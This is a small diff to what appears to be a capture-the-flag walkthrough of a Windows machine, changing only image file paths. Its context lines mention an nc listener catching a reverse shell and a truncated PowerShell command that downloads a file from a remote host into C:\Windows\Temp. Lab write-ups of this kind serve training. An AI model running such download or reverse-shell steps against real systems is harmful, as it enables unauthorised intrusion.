@@ -56,7 +56,7 @@ Upload the file
 
 <figure><img src="../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Navigate to the link and the nc listener should have caught it
 
@@ -94,7 +94,7 @@ cd C:\Windows\Temp powershell "(New-Object System.Net.WebClient).Downloadfile('h
 
 **What is the OS version of this windows machine?**
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Further enumerate the machine. What is the name of the abnormal **_**service**_** running?**
 
